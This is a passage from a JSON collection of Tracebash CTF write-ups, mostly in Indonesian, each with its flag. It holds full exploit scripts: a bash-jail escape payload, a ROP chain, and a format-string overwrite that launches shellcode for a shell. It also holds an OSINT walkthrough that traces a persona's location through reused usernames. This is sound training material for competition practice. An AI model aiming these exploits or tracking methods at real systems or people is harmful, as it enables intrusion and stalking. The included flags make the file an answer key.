        "code": "#!/usr/bin/env python3\r\nfrom pwn import remote\r\nimport re\r\n\r\nHOST = \"13.127.119.28\"\r\nPORT = 1337\r\n\r\n# Build \".\" from \"jail.sh\", then source the first 8-char glob match: flag.txt.\r\nPAYLOAD = b\": ???????;__=$_;__=${__#????};__=${__:$#:${##}};${__} ????????\"\r\n\r\n\r\ndef main() -> None:\r\n    r = remote(HOST, PORT)\r\n    r.recvuntil(b\"Nash> \")\r\n    r.sendline(PAYLOAD)\r\n    data = r.recvrepeat(2).decode(\"utf-8\", \"ignore\")\r\n    print(data, end=\"\")\r\n\r\n    match = re.search(r\"TBCTF\\{[^}]+\\}\", data)\r\n    if match:\r\n        print(match.group(0))\r\n\r\n    r.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{r357r1c73d_bu7_n07_1mp0551bl3}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-misc-unzipme",
    "title": "Unzip Me",
    "ctfName": "Tracebash",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Flag: `TBCTF{br0_kn0w5_3v3ry_3nc0d1ng}`",
    "problemDescription": "Flag: `TBCTF{br0_kn0w5_3v3ry_3nc0d1ng}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkas",
        "content": "`secret.zip` hanya pembungkus awal. Di dalamnya ada pasangan file berulang: `secret.7z` dan `pass`. Isi `pass` bukan password mentah, tetapi encoding yang harus dibalik untuk membuka layer berikutnya.\n\nUrutan decoding yang dipakai:\n\n| Layer | Isi `pass` | Decoding | Password |\n|---:|---|---|---|\n| 0 | karakter printable aneh | ROT47 | `R0T47_p@SSw0Rdc81ae068` |\n| 1 | byte hex `C5 C2 ...` | EBCDIC / cp037 | `EBCDIC_P@sSw0Rdd1c72fc4` |\n| 2 | angka 0–63 | nilai + 32 ke ASCII | `6B1T_PASSW0RD28622B4D` |\n| 3 | Motorola S-Record | ambil data record `S1` | `SR3C_PAsSw0rd1943f79c` |\n| 4 | Intel HEX | ambil record data type `00` | `IH3X_PAssw0rd3db29edd` |\n| 5 | Unicode symbols | Base32768 | `b@se32768_PAssw0rd91fa13ae` |\n| 6 | string ASCII simbol | Base91 | `base91_P@ssw0rd1551de6c` |\n\nSetelah layer terakhir dibuka, file `flag.txt` berisi flag."
      },
      {
        "title": "Cara jalanin",
        "content": "Output utama:",
        "code": "python3 -m pip install py7zr\npython3 solve.py"
      },
      {
        "title": "Catatan eksploitasi",
        "content": "Tidak ada brute force password. Semua password diturunkan dari file `pass` di setiap layer. Script melakukan ekstraksi ZIP awal, decode password sesuai format layer, lalu membuka arsip 7z berikutnya secara otomatis sampai `flag.txt` terbaca."
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{br0_kn0w5_3v3ry_3nc0d1ng}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-osint-retiredhacker",
    "title": "Retired Hacker — OSINT Walkthrough",
    "ctfName": "Tracebash",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Retired Hacker — OSINT Walkthrough",
    "problemDescription": "",
    "tools": [],
    "analysis": "File challenge berisi screenshot percakapan dengan seseorang yang mengaku sudah meninggalkan dunia hacking. Sekarang ia lebih sering melakukan aktivitas seperti hiking, bersepeda, dan berlari.\n\nPetunjuk terpenting pada screenshot bukan username chat-nya, tetapi sebuah URL Komoot yang dibagikan langsung:\n\n```text\nhttps://www.komoot.com/user/5667624959835\n```\n\nKomoot adalah platform untuk mencatat aktivitas outdoor seperti hiking, cycling, dan running. Karena URL berisi ID pengguna yang spesifik, profil tersebut menjadi pivot pertama.\n\nQuery alternatif:\n\n```text\n\"5667624959835\"\n\"komoot.com/user/5667624959835\"\n```\n\n---",
    "solution": [
      {
        "title": "Challenge",
        "content": "**Judul:** Retired Hacker  \n**Kategori:** OSINT\n\n> A leaked chat screenshot reveals an individual who walked away from the hacking scene. Investigate the person and identify the tram station where they got off on May 7, 2026.\n\nFormat flag:\n\n\n\nSpasi pada nama halte harus diganti dengan underscore.\n\n---",
        "code": "TBCTF{Tram_Station_Name}"
      },
      {
        "title": "TL;DR",
        "content": "Jalur investigasinya:\n\n\n\nFlag:\n\n\n\n---",
        "code": "Screenshot chat\n→ profil Komoot\n→ Jim Lee\n→ handle jiml33t\n→ posting Threads tanggal 7 Mei 2026\n→ tulisan irigatii.ro\n→ Calea Buziașului, Timișoara\n→ Auchan Buziașului\n→ halte Piața Gheorghe Domășneanu"
      },
      {
        "title": "2. Pivot dari Komoot ke identitas target",
        "content": "Profil Komoot tersebut menggunakan nama:\n\n\n\nDari profil dan jejak publik yang saling terhubung, ditemukan handle:\n\n\n\nHandle tersebut juga digunakan pada GitHub:\n\n\n\nBio akun GitHub mengandung informasi seperti:\n\n\n\nInformasi ini cocok dengan isi screenshot:\n\n- Target pernah aktif di dunia hacking.\n- Target sekarang lebih fokus pada aktivitas outdoor.\n- Deskripsi challenge menyebut seseorang yang meninggalkan hacking scene.\n\nKecocokan persona dan penggunaan handle yang sama membuat `jiml33t` menjadi kandidat target yang kuat.\n\nQuery yang dapat digunakan:\n\n\n\n---",
        "code": "Jim Lee"
      },
      {
        "title": "3. Mencari aktivitas pada 7 Mei 2026",
        "content": "Challenge meminta lokasi target secara spesifik pada:\n\n\n\nDengan handle `jiml33t`, pencarian dilanjutkan ke platform sosial lain. Ditemukan akun Threads dengan handle yang sama.\n\nPada posting yang relevan tanggal 7 Mei 2026, target menyebut bahwa ia:\n\n1. Selesai melakukan aktivitas lari.\n2. Naik trem.\n3. Turun untuk menuju supermarket Prancis favoritnya.\n4. Ingin membeli atau meminum kopi.\n\nPosting tersebut juga menyertakan foto lingkungan sekitar. Pada salah satu bagian foto terlihat tulisan:\n\n\n\nDari sini terdapat dua kelompok petunjuk:\n\n- `irigatii.ro` digunakan untuk menentukan kota dan area.\n- “French supermarket” digunakan untuk menentukan tujuan target.\n\nQuery yang membantu:\n\n\n\n---",
        "code": "May 7, 2026"
      },
      {
        "title": "4. Geolokasi melalui tulisan `irigatii.ro`",
        "content": "Tulisan `irigatii.ro` kemungkinan merupakan nama domain atau bisnis lokal. Pencarian terhadap domain tersebut mengarah ke sebuah lokasi di Romania.\n\nAlamat landmark tersebut berada di:\n\n\n\nDengan demikian, kota target dapat dipersempit menjadi:\n\n\n\nHal ini penting karena Timișoara memiliki jaringan trem yang aktif. Petunjuk target menaiki trem menjadi konsisten dengan kota tersebut.\n\nQuery yang dapat digunakan:\n\n\n\n---",
        "code": "Calea Buziașului 13\nTimișoara, Romania"
      },
      {
        "title": "5. Mengidentifikasi “French supermarket”",
        "content": "Caption menyebut sebuah supermarket Prancis.\n\nSalah satu jaringan supermarket Prancis yang beroperasi di Romania adalah:\n\n\n\nDi area Calea Buziașului terdapat:\n\n\n\nAlamat tersebut sangat dekat dengan landmark `irigatii.ro` yang berada di nomor 13.\n\nKedekatan kedua alamat memperkuat kesimpulan bahwa supermarket yang dimaksud target adalah Auchan Buziașului.\n\n\n\nKarena target mengatakan turun dari trem sebelum menuju supermarket tersebut, halte yang dicari harus berada di sekitar kompleks Auchan atau area AEM.\n\nQuery:\n\n\n\n---",
        "code": "Auchan"
      },
      {
        "title": "6. Menentukan halte trem",
        "content": "Pencarian halte di sekitar Auchan Buziașului dan Calea Buziașului mengarah ke:\n\n\n\nNama tersebut muncul pada jaringan transportasi Timișoara. Pada beberapa rute, lokasinya juga diberi penjelas seperti:\n\n\n\natau dikaitkan dengan area:\n\n\n\nBagian dalam tanda kurung hanya berfungsi sebagai penjelas lokasi atau arah platform. Nama halte utamanya tetap:\n\n\n\nValidasi sebaiknya dilakukan menggunakan situs operator transportasi resmi Timișoara, yaitu SMTT, bukan hanya mengandalkan label peta atau blog pihak ketiga.\n\nQuery validasi:\n\n\n\n---",
        "code": "Piața Gheorghe Domășneanu"
      },
      {
        "title": "7. Perbedaan ejaan nama halte",
        "content": "Beberapa sumber pihak ketiga menulis nama belakangnya sebagai:\n\n\n\nNamun, sumber transportasi resmi menggunakan:\n\n\n\nKarena flag challenge biasanya mengikuti nama resmi lokasi, versi dengan huruf `u` di akhir merupakan kandidat paling kuat.\n\nNama halte:\n\n\n\nSetelah spasi diganti underscore:\n\n\n\n---",
        "code": "Domășnean"
      },
      {
        "title": "Referensi",
        "content": "- Komoot user profile  \n  `https://www.komoot.com/user/5667624959835`\n\n- GitHub `jiml33t`  \n  `https://github.com/jiml33t`\n\n- Threads post  \n  `https://www.threads.com/@jiml33t/post/DYCg8B1iMAl/media`\n\n- Irigații.ro  \n  `https://irigatii.ro/`\n\n- Auchan Romania store directory  \n  `https://www.auchan.ro/magazine-auchan`\n\n- SMTT Timișoara  \n  `https://smtt.ro/linie-transport-public-9-r/`\n\n---"
      },
      {
        "title": "Kesimpulan",
        "content": "Challenge ini diselesaikan dengan teknik username reuse dan context chaining.\n\nSatu URL Komoot dari screenshot membawa ke identitas Jim Lee dan handle `jiml33t`. Handle tersebut kemudian digunakan untuk menemukan posting tanggal 7 Mei 2026. Tulisan `irigatii.ro` pada foto menentukan area Calea Buziașului di Timișoara, sedangkan petunjuk “French supermarket” mengarah ke Auchan Buziașului.\n\nHalte trem yang melayani area tersebut dan menggunakan nama resmi pada jaringan transportasi Timișoara adalah:\n\n\n\nSehingga flag akhirnya:",
        "code": "Piața Gheorghe Domășneanu"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{Piata_Gheorghe_Domasneanu}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-pwn-bannedbyters",
    "title": "Banned Bytes",
    "ctfName": "Tracebash",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "`vuln` punya stack overflow langsung:",
    "problemDescription": "`vuln` punya stack overflow langsung:\n\n- `read(0, buf, 0x200)` nulis ke buffer stack ukuran `0x50`\n- No canary, no PIE, NX aktif\n- Setelah baca input, program nol-in setiap byte `x`, `g`, `a`, dan `.`\n\nTargetnya bukan shell. Binary sudah import `print_file()` dari `libprint.so`, jadi cukup panggil itu dengan argumen `flag.txt`.\n\nMasalahnya string `flag.txt` sendiri kena filter. Solusinya:\n\n1. Tulis string ter-encode `dnce,vzv` ke `.bss`\n2. XOR tiap byte dengan `0x02` pakai gadget yang sudah disediakan binary\n3. `pop rdi; ret`\n4. Panggil `print_file@plt`\n\nOffset RIP ada di `0x50 + 8 = 88`.\n\nROP yang dipakai:\n\n```text\n0x40125b  pop r12; pop r13; pop r14; pop r15; ret\n0x401269  mov qword ptr [r13], r12; ret\n0x401264  pop r14; pop r15; ret\n0x40126e  xor byte ptr [r15], r14b; ret\n0x401272  pop rdi; ret\n0x401060  print_file@plt\n```\n\nAlamat tulis yang aman: `0x404068`. Saya sengaja hindari `0x404060` karena byte alamat `0x67` pada salah satu offset bakal kena filter.\n\nTwist utamanya ada di service wrapper. Target jalan lewat `socat ...,pty`, jadi beberapa byte kontrol di payload tidak sampai utuh ke program. Byte `0x12` dari alamat gadget `0x4012xx` diperlakukan sebagai `Ctrl-R` oleh line discipline PTY dan malah me-reprint input. Bypass-nya adalah quote byte kontrol dengan `0x16` (`Ctrl-V`) sebelum dikirim. Terminal akan mengonsumsi `0x16` dan meneruskan byte berikutnya secara literal ke `read()`.\n\nContoh output:\n\n```text\n$ python3 solve.py\n[+] Opening connection to 13.127.119.28 on port 1338: Done\nYou entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nTBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}\n```\n\nJalankan:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "from pwn import *\r\n\r\ncontext.binary = elf = ELF(\"./vuln\")\r\ncontext.log_level = \"info\"\r\n\r\nHOST = \"13.127.119.28\"\r\nPORT = 1338\r\n\r\nOFFSET = 88\r\nWRITE_ADDR = 0x404068\r\nENCODED_NAME = b\"dnce,vzv\"\r\nXOR_KEY = 0x02\r\n\r\nTTY_QUOTE_BYTES = {\r\n    0x03,\r\n    0x04,\r\n    0x11,\r\n    0x12,\r\n    0x13,\r\n    0x15,\r\n    0x16,\r\n    0x17,\r\n    0x1A,\r\n    0x1C,\r\n    0x7F,\r\n}\r\n\r\n\r\ndef tty_quote(data: bytes) -> bytes:\r\n    out = bytearray()\r\n    for byte in data:\r\n        if byte in TTY_QUOTE_BYTES:\r\n            out.append(0x16)\r\n        out.append(byte)\r\n    return bytes(out)\r\n\r\n\r\ndef build_payload() -> bytes:\r\n    pop_r12_r13_r14_r15 = elf.symbols[\"gadget_pop_r12_r13_r14_r15_ret\"]\r\n    pop_r14_r15 = elf.symbols[\"gadget_pop_r14_r15_ret\"]\r\n    mov_r13_r12 = elf.symbols[\"gadget_mov_r13_r12_ret\"]\r\n    xor_r15_r14b = elf.symbols[\"gadget_xor_r15_r14b_ret\"]\r\n    pop_rdi = elf.symbols[\"gadget_pop_rdi_ret\"]\r\n    print_file = elf.plt[\"print_file\"]\r\n\r\n    payload = flat(\r\n        b\"A\" * OFFSET,\r\n        pop_r12_r13_r14_r15,\r\n        ENCODED_NAME,\r\n        WRITE_ADDR,\r\n        0,\r\n        0,\r\n        mov_r13_r12,\r\n    )\r\n\r\n    for index in range(len(ENCODED_NAME)):\r\n        payload += flat(\r\n            pop_r14_r15,\r\n            XOR_KEY,\r\n            WRITE_ADDR + index,\r\n            xor_r15_r14b,\r\n        )\r\n\r\n    payload += flat(\r\n        pop_rdi,\r\n        WRITE_ADDR,\r\n        print_file,\r\n    )\r\n    return payload\r\n\r\n\r\ndef main():\r\n    io = remote(HOST, PORT)\r\n    io.recvuntil(b\"Input: \")\r\n    io.send(tty_quote(build_payload()) + b\"\\n\")\r\n    io.interactive()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-pwn-legacyledger",
    "title": "Legacy Ledger",
    "ctfName": "Tracebash",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Binary ini punya bug format string di menu `deposit` dan `withdraw`. Input dipassing langsung ke `printf(buf)` tanpa format tetap, jadi kita dapat arbitrary write dengan `%n`.",
    "problemDescription": "Binary ini punya bug format string di menu `deposit` dan `withdraw`. Input dipassing langsung ke `printf(buf)` tanpa format tetap, jadi kita dapat arbitrary write dengan `%n`.\n\nBanner awal juga ngebocorin alamat stack:\n\n```text\n%p, %p\n```\n\nPointer pertama adalah alamat buffer input di stack (`rbp-0x410`). Dari situ lokasi saved return address bisa dihitung langsung:\n\n```text\nsaved_rip = buf_addr + 0x418\n```\n\n`checksec` nunjukin dua hal yang bikin jalurnya simpel:\n\n- PIE aktif, jadi alamat code acak.\n- Stack executable karena binary di-build dengan `-z execstack`.\n\nJadi tidak perlu ret2libc. Cukup:\n\n1. Ambil leak alamat `buf` dari banner.\n2. Masuk ke menu `deposit`.\n3. Kirim format string payload untuk overwrite saved RIP ke shellcode yang kita taruh di buffer yang sama.\n4. Shellcode diletakkan agak ke belakang supaya input `exit` berikutnya tidak merusak byte awal shellcode.\n5. Kirim `exit` supaya `main()` return dan lompat ke shellcode.\n6. Setelah dapat shell, baca `/app/flag.txt`.\n\nDisassembly bagian vulnerable:\n\n```asm\n12c7: call fgets@plt\n12cc: lea  rax,[rbp-0x410]\n12d3: mov  rdi,rax\n12db: call printf@plt\n```\n\nItu cukup untuk arbitrary write dengan `fmtstr_payload(12, ...)`.\n\nPayload final pakai `write_size=\"short\"` buat nulis alamat shellcode ke saved RIP, lalu append `shellcraft.sh()` ke buffer.\n\nRun exploit:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py REMOTE\n```\n\nOutput:\n\n```text\nTBCTF{b0rg3d-5t@ck}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\ncontext.binary = elf = ELF(\"./chall\", checksec=False)\r\ncontext.arch = \"amd64\"\r\n\r\nHOST = args.HOST or \"13.127.119.28\"\r\nPORT = int(args.PORT or 1336)\r\n\r\n\r\ndef build_payload(buf_addr: int) -> bytes:\r\n    saved_rip = buf_addr + 0x418\r\n    shellcode = asm(shellcraft.sh())\r\n\r\n    shell_off = 0x80\r\n    for _ in range(10):\r\n        shell_addr = buf_addr + shell_off\r\n        probe = fmtstr_payload(12, {saved_rip: shell_addr}, write_size=\"short\")\r\n        new_off = ((len(probe) + 0x10 + 7) // 8) * 8\r\n        if new_off == shell_off:\r\n            break\r\n        shell_off = new_off\r\n\r\n    shell_addr = buf_addr + shell_off\r\n    payload = fmtstr_payload(12, {saved_rip: shell_addr}, write_size=\"short\")\r\n    return payload.ljust(shell_off, b\"B\") + shellcode\r\n\r\n\r\ndef solve(io):\r\n    banner = io.recvline().decode().strip()\r\n    buf_addr, _ = [int(x, 16) for x in banner.split(\", \")]\r\n    io.recvline()\r\n\r\n    payload = build_payload(buf_addr)\r\n\r\n    io.sendline(b\"deposit\")\r\n    io.recvuntil(b\"Enter amount: \")\r\n    io.sendline(payload)\r\n    io.recvuntil(b\"What would you like\")\r\n\r\n    io.sendline(b\"exit\")\r\n    if args.SHELL:\r\n        io.interactive()\r\n        return\r\n\r\n    io.sendline(b\"cat /app/flag.txt\")\r\n    data = io.recvrepeat(1)\r\n    print(data.decode(\"latin-1\", errors=\"replace\"))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    if args.REMOTE:\r\n        tube = remote(HOST, PORT)\r\n    else:\r\n        tube = process(\"./chall\")\r\n    solve(tube)"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{b0rg3d-5t@ck}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-rev-fingeraritmetic",
    "title": "Finger Arithmetic — Reverse Engineering",
    "ctfName": "Tracebash",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Finger Arithmetic — Reverse Engineering",
    "problemDescription": "Binary meminta key sepanjang 32 karakter. Pemeriksaan tidak membandingkan angka secara langsung, tetapi merender setiap nilai integer menjadi PNG berisi empat bentuk tangan lalu membandingkannya dengan PNG target yang ditanam di `.rodata`.\n\nFlag:\n\n```text\nTBCTF{ju75u5_n_d34d_3nd5_4w417!}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Triage",
        "content": "Binary berupa ELF 64-bit PIE, tidak stripped. Simbol yang paling relevan:\n\n\n\nString prompt dan pesan hasil disimpan dalam bentuk XOR sederhana. Setelah didekode, alur `main` menjadi:\n\n1. Baca input.\n2. Pastikan panjangnya 32 byte.\n3. Periksa empat byte pertama.\n4. Pastikan karakter indeks ke-5 adalah `{`.\n5. Jalankan `validate_checksum_v2`.\n6. Cetak pesan sukses bila seluruh pemeriksaan lolos.",
        "code": "file 'chall(2)'\nchecksec --file='chall(2)'\nnm -C 'chall(2)' | grep -E 'main|validate|compare_hand'"
      },
      {
        "title": "Mekanisme gambar tangan",
        "content": "`compare_hand_png_i32()` menerima integer 32-bit, merender empat tangan ke kanvas 256×256, mengubahnya menjadi PNG, lalu membandingkannya dengan PNG referensi.\n\nSetiap tangan merepresentasikan satu byte:\n\n- tujuh posisi jari menyimpan bit 0–6;\n- arah tangan menyimpan bit 7;\n- warna, rotasi, dan pose tambahan diturunkan dari keseluruhan integer agar template sederhana sulit dipakai.\n\nPNG target diekstrak dari `.rodata`. Nilainya dibaca dengan membuat dataset lokal dari renderer binary, mengklasifikasikan bentuk jari, lalu menguji kandidat teratas dengan render pixel-perfect. Kandidat benar menghasilkan PNG yang identik byte-per-byte dengan target tertanam.\n\nDelapan integer target yang berhasil dipulihkan:",
        "code": "t0 = 0x65657598\nt1 = 0x100f0ede\nt2 = 0x25662659\nt3 = 0x41394806\nt4 = 0xa09d7c39\nt5 = 0x95f9120a\nt6 = 0x9e7e2255\nt7 = 0xe35f1564"
      },
      {
        "title": "Membalik validasi",
        "content": "Input dibagi menjadi delapan word little-endian `u0` sampai `u7`. Fungsi validasi membentuk target berikut:\n\n\n\nSemua operasi memakai aritmetika 32-bit. Persamaan dibalik menjadi:\n\n\n\nHasil per chunk:\n\n\n\nGabung seluruh chunk:",
        "code": "t0 = u0 + 0x11223344\nt1 = u1 ^ t0\nt2 = u2 - t1\nt3 = u3 ^ t2\nt4 = u4 + t3\nt5 = u5 ^ t4\nt6 = u6 - t5\nt7 = u7 ^ t6"
      },
      {
        "title": "Solver",
        "content": "Output:\n\n\n\nValidasi manual:",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Reconstruct the 32-byte key for TBCTF Finger Arithmetic.\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\nMASK32 = 0xFFFFFFFF\r\n\r\n# Integer values recovered from the eight embedded hand-sign PNG targets.\r\nTARGETS = (\r\n    0x65657598,\r\n    0x100F0EDE,\r\n    0x25662659,\r\n    0x41394806,\r\n    0xA09D7C39,\r\n    0x95F9120A,\r\n    0x9E7E2255,\r\n    0xE35F1564,\r\n)\r\n\r\n\r\ndef recover_key() -> bytes:\r\n    t0, t1, t2, t3, t4, t5, t6, t7 = TARGETS\r\n\r\n    chunks = (\r\n        (t0 - 0x11223344) & MASK32,\r\n        t1 ^ t0,\r\n        (t2 + t1) & MASK32,\r\n        t3 ^ t2,\r\n        (t4 - t3) & MASK32,\r\n        t5 ^ t4,\r\n        (t6 + t5) & MASK32,\r\n        t7 ^ t6,\r\n    )\r\n\r\n    key = b\"\".join(value.to_bytes(4, \"little\") for value in chunks)\r\n    if len(key) != 32:\r\n        raise RuntimeError(f\"unexpected key length: {len(key)}\")\r\n    return key\r\n\r\n\r\ndef validate_locally(binary: Path, key: bytes) -> str:\r\n    proc = subprocess.run(\r\n        [str(binary)],\r\n        input=key + b\"\\n\",\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.STDOUT,\r\n        check=False,\r\n    )\r\n    output = proc.stdout.decode(\"utf-8\", errors=\"replace\")\r\n    if \"Correct!\" not in output:\r\n        raise RuntimeError(f\"binary rejected recovered key:\\n{output}\")\r\n    return output\r\n\r\n\r\ndef main() -> None:\r\n    key = recover_key()\r\n    flag = key.decode(\"ascii\")\r\n    print(flag)\r\n\r\n    binary = Path(__file__).with_name(\"chall(2)\")\r\n    if binary.is_file():\r\n        validate_locally(binary, key)\r\n        print(\"[+] Local validation passed\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{ju75u5_n_d34d_3nd5_4w417!}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-rev-layercake",
    "title": "LayerCake (Reverse)",
    "ctfName": "Tracebash",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge LayerCake (Reverse)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Flow program:\n\n1. Validasi argc == 2, kalau gak ada argumen → print usage.\n2. `atoi(argv[1])` → key, harus 0-255.\n3. `memcpy` 26 byte ciphertext dari `.data @ 0x4050` ke stack buffer.\n4. `srand(time(NULL))` lalu `rand() % 100` → nilai random `R` (0-99), berubah tiap kali binary dijalankan — ini sumber output yang \"berbeda setiap run\" kayak yang disebut di deskripsi challenge.\n5. Buffer di-transform lewat 4 fungsi berurutan:\n   - `fcn.1303(buf, len, R)` → tiap byte di-XOR sama `R`\n   - `fcn.12ad(buf, len)` → tiap byte di-XOR sama tabel `T[i] = (i*7 + 11) & 0xFF` (dihasilkan dari kombinasi shift+sub di fungsi itu, bukan tabel statis di memori — tapi behaviour-nya identik formula linear ini)\n   - `fcn.11f2(buf, len, 1)` → rotate-left 3 bit tiap byte (arg ke-3 nentuin arah/jumlah rotasi)\n   - `fcn.11a9(buf, len, K)` → tiap byte di-XOR sama key user `K`\n6. `puts(buf)` — print hasil akhir.\n\nJadi output yang keliatan di README (\"garbage\" pas dijalanin dengan key 0/128/255) itu karena kombinasi `R` (random) dan `K` (key) yang gak pas. Cuma kombinasi tertentu dari `R` dan `K` yang bikin `R XOR K` ketemu nilai yang pas buat decode jadi plaintext — itu makna dari \"every now and then, one of those is right.\"",
    "solution": [
      {
        "title": "Info",
        "content": "- **Binary**: `challenge` — ELF 64-bit, dynamically linked, x86-64, not stripped (simbol fungsi kebawa)\n- **Flag**: `TBCTF{mult1_lay3r_r3v3rs3}`"
      },
      {
        "title": "Recon",
        "content": "`afl` di r2 cuma nemu lima fungsi anonim (`fcn.1303`, `fcn.12ad`, `fcn.11f2`, `fcn.11a9`) plus `entry0` — `main` gak ke-detect otomatis. Cek `entry0`:\nlea rdi, [0x134c]\n\ncall __libc_start_main\nAddress `0x134c` itu argumen ketiga (`main`) buat `__libc_start_main`. r2 gagal define function di situ karena nyambung langsung sama akhir `fcn.1303` (di alamat 0x134b: `pop rbp; ret`) tanpa padding. Define manual:\n\naf @ 0x134c\n\npdf @ 0x134c"
      },
      {
        "title": "Insight exploit",
        "content": "`R` cuma punya 100 kemungkinan (`rand() % 100`), `K` cuma punya 256 kemungkinan (constraint `atoi` 0-255). Total search space cuma 25.600 — kecil banget buat brute force offline, gak perlu interaksi sama binary atau prediksi seed RNG sama sekali.\n\nFormula forward:\n\nO[i] = ROL3( D[i] ^ R ^ T[i] ) ^ K,   T[i] = (i*7+11) & 0xFF\n\nBrute semua `(R, K)`, filter output yang printable ASCII dan match pattern `TBCTF{...}` — langsung ketemu satu kandidat valid (`R` dan `K` saling kompensasi linear, makanya muncul di banyak pasangan berbeda, tapi hasil decode-nya selalu sama)."
      },
      {
        "title": "Exploit",
        "content": "Output: `TBCTF{mult1_lay3r_r3v3rs3}`",
        "code": "D = bytes.fromhex(\"08d3f82366c8111b474dfe3a5bc3cb9bbce04e7fd071624b5c9c\")\n\ndef rol3(b):\n    return ((b << 3) | (b >> 5)) & 0xFF\n\ndef transform(R, K):\n    out = bytearray(len(D))\n    for i in range(len(D)):\n        t = (i * 7 + 11) & 0xFF\n        v = D[i] ^ R ^ t\n        v = rol3(v)\n        v ^= K\n        out[i] = v\n    return bytes(out)\n\nfor R in range(100):\n    for K in range(256):\n        out = transform(R, K)\n        if out.startswith(b\"TBCTF{\") and out.endswith(b\"}\"):\n            print(R, K, out.decode())"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\n\r\nD = bytes.fromhex(\"08d3f82366c8111b474dfe3a5bc3cb9bbce04e7fd071624b5c9c\")\r\nN = len(D)\r\n\r\ndef rol3(b):\r\n    return ((b << 3) | (b >> 5)) & 0xFF\r\n\r\ndef transform(R, K):\r\n    out = bytearray(N)\r\n    for i in range(N):\r\n        t = (i * 7 + 11) & 0xFF\r\n        v = D[i] ^ R ^ t\r\n        v = rol3(v)\r\n        v ^= K\r\n        out[i] = v\r\n    return bytes(out)\r\n\r\ncandidates = []\r\nfor R in range(100):\r\n    for K in range(256):\r\n        out = transform(R, K)\r\n        if all(32 <= c < 127 for c in out):\r\n            try:\r\n                s = out.decode()\r\n            except:\r\n                continue\r\n            if \"{\" in s and \"}\" in s:\r\n                candidates.append((R, K, s))\r\n\r\nfor R, K, s in candidates:\r\n    print(f\"R={R:3d} K={K:3d} -> {s}\")\r\n\r\nprint(f\"\\nTotal candidates: {len(candidates)}\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{mult1_lay3r_r3v3rs3}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-rev-rotatingcogs",
    "title": "Rotating Cogs — Reverse",
    "ctfName": "Tracebash",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Rotating Cogs — Reverse",
    "problemDescription": "`vm` adalah interpreter 64-bit untuk bytecode berukuran 64 KiB. Opcode disamarkan dengan key yang berubah saat instruksi `MKEY` dijalankan. Bytecode juga menyalin dan mendekripsi dua payload ke alamat baru sebelum validator akhir dieksekusi.\n\nValidator ternyata tidak memeriksa seluruh input. VM membaca 15 byte, tetapi checksum hanya memakai `input[6:14]`. Prefix `LEET` adalah jalur palsu yang mencetak `N`, bukan jalur sukses.\n\nFlag yang dipakai solver:\n\n```text\nTBCTF{c0gs__r0r_m0d1!}\n```\n\nBinary mengembalikan karakter `C` untuk key tersebut.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Hasil penting:\n\n\n\nSymbol handler VM masih tersedia:\n\n\n\nStruct VM berisi delapan register 32-bit, `pc`, `sp`, hasil compare, memori 64 KiB, opcode key, dan status running.",
        "code": "file vm challenge.bin\nnm -C vm\nstrings -a vm"
      },
      {
        "title": "Dekripsi awal bytecode",
